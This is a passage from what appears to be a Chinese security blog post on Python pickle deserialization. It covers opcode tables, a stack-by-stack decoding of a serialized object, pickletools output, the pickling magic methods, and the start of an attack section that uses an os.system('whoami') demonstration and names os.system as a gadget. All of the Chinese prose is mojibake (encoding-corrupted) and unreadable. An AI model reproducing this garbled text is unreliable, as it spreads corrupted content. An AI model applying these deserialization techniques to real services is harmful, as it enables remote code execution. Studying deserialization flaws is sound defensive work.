ˆä¸Šå¼¹å‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå‚æ•°ï¼ˆå¿…é¡»ä¸ºå…ƒç»„ï¼‰ï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸ºå‡½æ•°ï¼Œç„¶åè°ƒç”¨è¯¥å‡½æ•°å¹¶æŠŠç»“æœå‹å›æ ˆ<br>STRING         = b&#x27;S&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å¯¹è±¡<br>BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument<br>SHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytes<br>UNICODE        = b&#x27;V&#x27;   # å®ä¾‹åŒ–ä¸€ä¸ª UNICODE å­—ç¬¦ä¸²å¯¹è±¡<br>BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argument<br>APPEND         = b&#x27;a&#x27;   # å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´  append åˆ°ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­<br>BUILD          = b&#x27;b&#x27;   # ä½¿ç”¨æ ˆä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆå‚¨å­˜å¤šä¸ª å±æ€§å-å±æ€§å€¼ çš„å­—å…¸ï¼‰å¯¹ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå¯¹è±¡å®ä¾‹ï¼‰è¿›è¡Œå±æ€§è®¾ç½®ï¼Œè°ƒç”¨ __setstate__ æˆ– __dict__.update()<br>GLOBAL         = b&#x27;c&#x27;   # è·å–ä¸€ä¸ªå…¨å±€å¯¹è±¡æˆ– import ä¸€ä¸ªæ¨¡å—ï¼ˆä¼šè°ƒç”¨ import è¯­å¥ï¼Œèƒ½å¤Ÿå¼•å…¥æ–°çš„åŒ…ï¼‰ï¼Œå‹å…¥æ ˆ<br>DICT           = b&#x27;d&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå­—å…¸ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ<br>EMPTY_DICT     = b&#x27;&#125;&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå­—å…¸<br>APPENDS        = b&#x27;e&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶ extends åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­<br>GET            = b&#x27;g&#x27;   # å°† memo[n] çš„å‹å…¥æ ˆ<br>BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte arg<br>INST           = b&#x27;i&#x27;   # ç›¸å½“äº c å’Œ o çš„ç»„åˆï¼Œå…ˆè·å–ä¸€ä¸ªå…¨å±€å‡½æ•°ï¼Œç„¶åä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œä»¥è¯¥å…ƒç»„ä¸ºå‚æ•°æ‰§è¡Œå…¨å±€å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰<br>LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg<br>LIST           = b&#x27;l&#x27;   # ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºåˆ—è¡¨<br>EMPTY_LIST     = b&#x27;]&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºåˆ—è¡¨<br>OBJ            = b&#x27;o&#x27;   # ä»æ ˆé¡¶å¼€å§‹å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œä»¥ä¹‹é—´çš„ç¬¬ä¸€ä¸ªæ•°æ®ï¼ˆå¿…é¡»ä¸ºå‡½æ•°ï¼‰ä¸º callableï¼Œç¬¬äºŒä¸ªåˆ°ç¬¬ n ä¸ªæ•°æ®ä¸ºå‚æ•°ï¼Œæ‰§è¡Œè¯¥å‡½æ•°ï¼ˆæˆ–å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼‰ï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœï¼Œ<br>PUT            = b&#x27;p&#x27;   # å°†æ ˆé¡¶å¯¹è±¡å‚¨å­˜è‡³ memo[n]<br>BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte arg<br>LONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte arg<br>SETITEM        = b&#x27;s&#x27;   # å°†æ ˆçš„ç¬¬ä¸€ä¸ªå¯¹è±¡ä½œä¸º valueï¼Œç¬¬äºŒä¸ªå¯¹è±¡ä½œä¸º keyï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ°æ ˆçš„ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•°å­—ä½œä¸º keyï¼‰ä¸­<br>TUPLE          = b&#x27;t&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œå¹¶ç»„åˆä¹‹é—´çš„æ•°æ®ä¸ºå…ƒç»„ï¼Œå¼¹å‡ºç»„åˆï¼Œå¼¹å‡º MARKï¼Œå‹å›ç»“æœ<br>EMPTY_TUPLE    = b&#x27;)&#x27;   # å‘æ ˆä¸­ç›´æ¥å‹å…¥ä¸€ä¸ªç©ºå…ƒç»„<br>SETITEMS       = b&#x27;u&#x27;   # å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ª MARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®ï¼ˆæ•°æ®å¿…é¡»æœ‰å¶æ•°ä¸ªï¼Œå³å‘ˆ key-value å¯¹ï¼‰å¹¶å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è¯¥ MARK ä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºå­—å…¸ï¼‰ä¸­<br>BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding<br><br>TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py<br>FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py<br></code></pre></td></tr></table></figure></p>
<p>å½“ç„¶ï¼Œè¿™äº›éƒ½æ˜¯ v0 åè®®çš„ opcodeï¼Œå…¶ä»–ç‰ˆæœ¬çš„åè®®ä¼šæ–°å¢/æ›¿æ¢ä¸€äº› opcodeï¼Œè¯¦è§èµ„æ–™ 2ã€‚</p>
<p>ä»¥ä¸Šé¢é‚£ä¸ª <code>b'ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.'</code> ä¸ºä¾‹ï¼Œæˆ‘ä»¬æ¥è§£è¯»ä¸€ä¸‹è¿™ä¸ªåºåˆ—åŒ–ç»“æœï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">c copy_reg _reconstructor: stack[copy_reg._reconstructor]<br><br>p <span class="hljs-number">0</span>: memo[copy_reg._reconstructor]<br><br>(: stack[(, copy_reg._reconstructor]<br><br>c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">1</span>: memo[copy_reg._reconstructor, __main__.Test]<br><br>c __builtin__ <span class="hljs-built_in">object</span>: stack[__builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">2</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>]<br><br>N: stack[<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>t: stack[(<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), copy_reg._reconstructor]<br><br>p <span class="hljs-number">3</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test)]<br><br>R stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">4</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>(: stack[(, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>d: stack[&#123;&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">5</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;]<br><br>V a: stack[<span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">6</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;, <span class="hljs-string">&quot;a&quot;</span>]<br><br>I <span class="hljs-number">1</span>: stack[<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>s: stack[&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>b: stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]  <span class="hljs-comment"># set a = 1</span><br><br>.: []  <span class="hljs-comment"># è¿”å› &lt;__main__.Test at 0x160578603d0&gt;</span><br></code></pre></td></tr></table></figure>
<p>æˆ‘æ„Ÿè§‰ï¼Œæ•´ä¸ªè¿‡ç¨‹æœ‰ç‚¹åƒè¯­æ³•åˆ†æé‡Œçš„ LR ç®—æ³•ï¼Œä¸æ–­ç§»è¿›-è§„çº¦ã€‚</p>
<p>è™½ç„¶è¿™ä¸ªç»“æœçš„å¯è¯»æ€§å¥½äº†å¾ˆå¤šï¼Œä½†æ˜¯ä¾æ—§ä¸å®¹æ˜“è¯»æ‡‚ã€‚</p>
<p>æ‰€ä»¥ Python å®˜æ–¹æä¾›äº†å·¥å…·ï¼Œå« <code>pickletools</code>ï¼Œå®ƒçš„ä½œç”¨ä¸»è¦æ˜¯ï¼š</p>
<ol type="1">
<li>å¯è¯»æ€§è¾ƒå¼ºçš„æ–¹å¼å±•ç¤ºä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼ˆ<code>pickletools.dis</code>ï¼‰</li>
<li>å¯¹ä¸€ä¸ªåºåˆ—åŒ–ç»“æœè¿›è¡Œä¼˜åŒ–ï¼ˆ<code>pickletools.optimize</code>ï¼‰</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-built_in">print</span>(pickletools.dis(serialized))<br></code></pre></td></tr></table></figure>
<p>ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;copy_reg _reconstructor&#x27;</span><br>   <span class="hljs-number">25</span>: p    PUT        <span class="hljs-number">0</span><br>   <span class="hljs-number">28</span>: (    MARK<br>   <span class="hljs-number">29</span>: c        GLOBAL     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-number">44</span>: p        PUT        <span class="hljs-number">1</span><br>   <span class="hljs-number">47</span>: c        GLOBAL     <span class="hljs-string">&#x27;__builtin__ object&#x27;</span><br>   <span class="hljs-number">67</span>: p        PUT        <span class="hljs-number">2</span><br>   <span class="hljs-number">70</span>: N        NONE<br>   <span class="hljs-number">71</span>: t        TUPLE      (MARK at <span class="hljs-number">28</span>)<br>   <span class="hljs-number">72</span>: p    PUT        <span class="hljs-number">3</span><br>   <span class="hljs-number">75</span>: R    REDUCE<br>   <span class="hljs-number">76</span>: p    PUT        <span class="hljs-number">4</span><br>   <span class="hljs-number">79</span>: (    MARK<br>   <span class="hljs-number">80</span>: d        DICT       (MARK at <span class="hljs-number">79</span>)<br>   <span class="hljs-number">81</span>: p    PUT        <span class="hljs-number">5</span><br>   <span class="hljs-number">84</span>: V    UNICODE    <span class="hljs-string">&#x27;a&#x27;</span><br>   <span class="hljs-number">87</span>: p    PUT        <span class="hljs-number">6</span><br>   <span class="hljs-number">90</span>: I    INT        <span class="hljs-number">1</span><br>   <span class="hljs-number">93</span>: s    SETITEM<br>   <span class="hljs-number">94</span>: b    BUILD<br>   <span class="hljs-number">95</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªè¦æ¯”è‡ªå·±åˆ†æåºåˆ—åŒ–ç»“æœæ¸…æ™°å¤šäº†ã€‚</p>
<p>ç»†å¿ƒçš„æ©˜å‹ä»¬ä¼šæ³¨æ„åˆ°ï¼Œåœ¨ä¸Šé¢é‚£ä¸ªäººå·¥åˆ†æåºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œmemo ä¸€ç›´æ˜¯åªæœ‰å‹å…¥ï¼Œæ²¡æœ‰å¼¹å‡ºï¼Œæ‰€ä»¥ memo é‡Œçš„æ•°æ®å‹æ ¹å°±ç”¨ä¸ç€ï¼Œé‚£ä¹ˆä¹Ÿæœ‰æ²¡å¿…è¦å‹å…¥äº†ã€‚æ‰€ä»¥ä¸Šé¢çš„åºåˆ—åŒ–ç»“æœå®Œå…¨å¯ä»¥æŠŠ <code>pn</code> éƒ½å»æ‰ï¼Œå†æŠŠä¸éœ€è¦çš„ <code>\n</code> ç§»é™¤ï¼Œä¼˜åŒ–ä¸ºï¼š<code>b'ccopy_reg\n_reconstructor\n(c__main__\nTest\nc__builtin__\nobject\nNtR(dVa\nI1\nsb.'</code>ï¼Œæˆ‘ä»¬æ¥æ‰§è¡Œä¸€ä¸‹è¯•è¯•ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/050a2946-9b39-4d74-a074-459fd1f71d80.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>pickletools.optimize</code> è‡ªåŠ¨ä¼˜åŒ–ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/282481f9-d78d-45db-aa57-91c9f2fbbea1.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>è™½ç„¶è¿™ä¸ªä¼˜åŒ–ç»“æœä¸æˆ‘ä»¬æ‰‹åŠ¨ä¼˜åŒ–æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œä½†æ˜¯åœ¨é‡åˆ°å¤æ‚çš„åºåˆ—åŒ–ç»“æœæ—¶ï¼Œæœ€å¥½è¿˜æ˜¯ç”¨è¿™ä¸ªæ–¹æ³•æ¥æã€‚</p>
<h3 id="å°ç»“">å°ç»“</h3>
<p>ç”±äºåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªå¯¹è±¡è¦èƒ½åœ¨å½“å‰ç¯å¢ƒä¸Šä¸‹æ–‡ä¸­åˆ›å»ºï¼Œæ‰€ä»¥åœ¨å®é™…çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œé‚£äº›é»˜è®¤åŠ è½½çš„åº“ã€æ ‡å‡†åº“ï¼ˆå¯è¢«è‡ªåŠ¨ importï¼‰å°±æˆäº†é¦–é€‰çš„ç±»ï¼Œæ¯”å¦‚ <code>os</code>ï¼Œå®ƒæœ‰ <code>system</code> æ–¹æ³•ã€‚</p>
<p>å¯¹äº Python å¯ä»¥è¢« pickle/unpickle çš„å¯¹è±¡ä»¥åŠå…¶ä»–ä¸€äº›æ³¨æ„äº‹é¡¹ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£ï¼Œè§èµ„æ–™ 3</p>
<p>æˆ‘è¿™é‡Œåˆ—å‡ºå‡ ç‚¹æ¯”è¾ƒé‡è¦çš„ï¼š</p>
<ol type="1">
<li>å‡½æ•°ï¼ˆå†…ç½®å‡½æ•°æˆ–ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼‰åœ¨è¢«å°å­˜æ—¶ï¼Œå¼•ç”¨çš„æ˜¯å‡½æ•°å…¨åï¼ˆè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ <code>lambda</code> å‡½æ•°ä¸å¯ä»¥è¢«å°å­˜ï¼šæ‰€æœ‰çš„åŒ¿åå‡½æ•°éƒ½æœ‰åŒä¸€ä¸ªåå­—ï¼š<code>&lt;lambda&gt;</code>ï¼‰ã€‚è¿™æ„å‘³ç€åªæœ‰å‡½æ•°æ‰€åœ¨çš„æ¨¡å—åï¼Œä¸å‡½æ•°åä¼šè¢«å°å­˜ï¼Œå‡½æ•°ä½“åŠå…¶å±æ€§ä¸ä¼šè¢«å°å­˜ã€‚å› æ­¤ï¼Œåœ¨è§£å°çš„ç¯å¢ƒä¸­ï¼Œå‡½æ•°æ‰€å±çš„æ¨¡å—å¿…é¡»æ˜¯å¯ä»¥è¢«å¯¼å…¥çš„ï¼Œè€Œä¸”æ¨¡å—å¿…é¡»åŒ…å«è¿™ä¸ªå‡½æ•°è¢«å°å­˜æ—¶çš„åç§°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</li>
<li>ç±»ä¹Ÿåªå°å­˜åç§°ï¼Œæ‰€ä»¥åœ¨è§£å°ç¯å¢ƒä¸­ä¹Ÿæœ‰å’Œå‡½æ•°ç›¸åŒçš„é™åˆ¶ã€‚æ³¨æ„ï¼Œç±»ä½“åŠå…¶æ•°æ®ä¸ä¼šè¢«å°å­˜ï¼Œåªæœ‰å®ä¾‹æ•°æ®ä¼šè¢«å°å­˜ï¼Œæ‰€ä»¥åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ç±»å±æ€§ attr ä¸ä¼šå­˜åœ¨äºè§£å°åçš„ç¯å¢ƒä¸­ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    attr = <span class="hljs-string">&#x27;A class attribute&#x27;</span><br><br>picklestring = pickle.dumps(Foo)<br></code></pre></td></tr></table></figure></li>
<li>å½“å®ä¾‹è§£å°æ—¶ï¼Œå®ƒçš„ <code>__init__()</code> æ–¹æ³•é€šå¸¸ä¸ä¼šè¢«è°ƒç”¨ã€‚å…¶é»˜è®¤åŠ¨ä½œæ˜¯ï¼šå…ˆåˆ›å»ºä¸€ä¸ªæœªåˆå§‹åŒ–çš„å®ä¾‹ï¼Œç„¶åè¿˜åŸå…¶å±æ€§ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">obj</span>):<br>    <span class="hljs-keyword">return</span> (obj.__class__, obj.__dict__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">cls, attributes</span>):<br>    obj = cls.__new__(cls)<br>    obj.__dict__.update(attributes)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure></li>
</ol>
<p>æœ€åéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº <code>0</code> çš„å­˜åœ¨ï¼Œä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¯ä»¥åŒ…å«å¾ˆå¤šä¸ªä¸ç›¸å…³çš„æ“ä½œï¼Œåœ¨åé¢ä¼šæœ‰ä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ã€‚</p>
<h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2>
<p>æœ¬æ¥æ‰“ç®—æŒ‰ç…§æ”»å‡»åœºæ™¯æ¥åˆ†ç±»çš„ï¼Œä½†æ˜¯æˆ‘å‘ç°åœºæ™¯å¤ªå¤šäº†ï¼Œè¿˜æ˜¯æŒ‰ç…§æ„é€ æ–¹å¼åˆ†ç±»ï¼Œæ”»å‡»æ‰‹æ³•ä½œä¸ºé™„å±ç¤ºä¾‹ä¼šæ¯”è¾ƒæ¸…æ™°ã€‚</p>
<p>payload çš„æ„é€ åˆ†ä¸ºç”¨é­”æœ¯æ–¹æ³•è‡ªåŠ¨æ„é€ å’Œæ‰‹åŠ¨æ„é€ ï¼ˆæ‰‹æ“ opcodeï¼‰ã€‚</p>
<h3 id="è‡ªåŠ¨æ„é€ ">è‡ªåŠ¨æ„é€ </h3>
<p>é¦–å…ˆï¼Œè¿™æ ·åºåˆ—åŒ–è‚¯å®šæ˜¯è¾¾ä¸åˆ°æ”»å‡»ç›®çš„çš„ï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = os.system(<span class="hljs-string">&quot;whoami&quot;</span>)<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br></code></pre></td></tr></table></figure></p>
<p><code>os.system("whoami")</code> åœ¨ <code>test = Test()</code> å°±ä¼šè¢«æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥è¿™ä¸ªå¯ä»¥è¯´æ˜¯è‡ªå·±æ—¥è‡ªå·±äº†ã€‚</p>
<h4 id="ç›¸å…³é­”æœ¯æ–¹æ³•">ç›¸å…³é­”æœ¯æ–¹æ³•</h4>
<p>ä¸Šé¢æåˆ°è¿‡ï¼Œè§£å°çš„æ—¶å€™æ˜¯æœ‰ä¸€ä¸ªé»˜è®¤çš„èµ‹å€¼è¿‡ç¨‹ï¼Œæ—¢ç„¶æ˜¯é»˜è®¤è¡Œä¸ºï¼Œå¾€å¾€æ˜¯æœ‰åŠæ³•è‡ªå®šä¹‰çš„ã€‚Python æä¾›äº†å¾ˆå¤šé­”æœ¯æ–¹æ³•ï¼ˆæ¯”å¦‚æ¯”è¾ƒå¸¸è§çš„ <code>__reduce__</code>ï¼‰ï¼Œæ¥æ”¹å˜è¿™ä¸€é»˜è®¤è¡Œä¸ºã€‚ä¸‹é¢ä¸€èµ·æ¥çœ‹ä¸‹è¿™äº›é­”æœ¯æ–¹æ³•éƒ½æ˜¯æ€ä¹ˆç”¨çš„ï¼ˆä¸‹é¢å‡ ä¸ªæ–¹æ³•çš„ä»‹ç»ï¼Œå†…å®¹å¤§éƒ¨åˆ†éƒ½æ˜¯æ‘˜å½•è‡ªå®˜æ–¹æ–‡æ¡£ï¼‰ã€‚</p>
<h5 id="getnewargs_ex__">__getnewargs_ex__()</h5>
<p>é™åˆ¶ï¼š</p>
<ol type="1">
<li>å¯¹äºä½¿ç”¨ v2 ç‰ˆæˆ–æ›´é«˜ç‰ˆåè®®çš„ pickle æ‰èƒ½ä½¿ç”¨æ­¤æ–¹æ³•</li>
<li>å¿…é¡»è¿”å›ä¸€å¯¹ <code>(args, kwargs)</code> ç”¨äºæ„å»ºå¯¹è±¡ï¼Œå…¶ä¸­ <code>args</code> æ˜¯è¡¨ç¤ºä½ç½®å‚æ•°çš„ tupleï¼Œè€Œ <code>kwargs</code> æ˜¯è¡¨ç¤ºå‘½åå‚æ•°çš„ dict</li>
</ol>
<p><code>__getnewargs_ex__()</code> æ–¹æ³• return çš„å€¼ï¼Œä¼šåœ¨è§£å°æ—¶ä¼ ç»™ <code>__new__()</code> æ–¹æ³•çš„ä½œä¸ºå®ƒçš„å‚æ•°ã€‚</p>
<h5 id="getnewargs__">__getnewargs__()</h5>
<p>é™åˆ¶ï¼š</p>
<ol type="1">
<li>å¿…é¡»è¿”å›ä¸€ä¸ª tuple ç±»å‹çš„ <code>args</code></li>
<li>å¦‚æœå®šä¹‰äº† <code>__getnewargs_ex__()</code>ï¼Œé‚£ä¹ˆ <code>__getnewargs__()</code> å°±ä¸ä¼šè¢«è°ƒç”¨ã€‚</li>
</ol>
<p>è¿™ä¸ªæ–¹æ³•ä¸ä¸Šä¸€ä¸ª <code>__getnewargs_ex__()</code> æ–¹æ³•ç±»ä¼¼ï¼Œä½†åªæ”¯æŒä½ç½®å‚æ•°ã€‚</p>
<p>æ³¨ï¼šåœ¨ Python 3.6 å‰ï¼Œv2ã€v3 ç‰ˆåè®®ä¼šè°ƒç”¨ <code>__getnewargs__()</code>ï¼Œæ›´é«˜ç‰ˆæœ¬åè®®ä¼šè°ƒç”¨ <code>__getnewargs_ex__()</code></p>
<h5 id="getstate__">__getstate__()</h5>
<p>ç±»è¿˜å¯ä»¥è¿›ä¸€æ­¥æ§åˆ¶å®ä¾‹çš„å°å­˜è¿‡ç¨‹ã€‚å¦‚æœç±»å®šä¹‰äº† <code>__getstate__()</code>ï¼Œå®ƒå°±ä¼šè¢«è°ƒç”¨ï¼Œå…¶è¿”å›çš„å¯¹è±¡æ˜¯è¢«å½“åšå®ä¾‹å†…å®¹æ¥å°å­˜çš„ï¼Œå¦åˆ™å°å­˜çš„æ˜¯å®ä¾‹çš„ <code>__dict__</code>ã€‚å¦‚æœ <code>__getstate__()</code> æœªå®šä¹‰ï¼Œå®ä¾‹çš„ <code>__dict__</code> ä¼šè¢«ç…§å¸¸å°å­˜ã€‚</p>
<h5 id="setstate__">__setstate__()</h5>
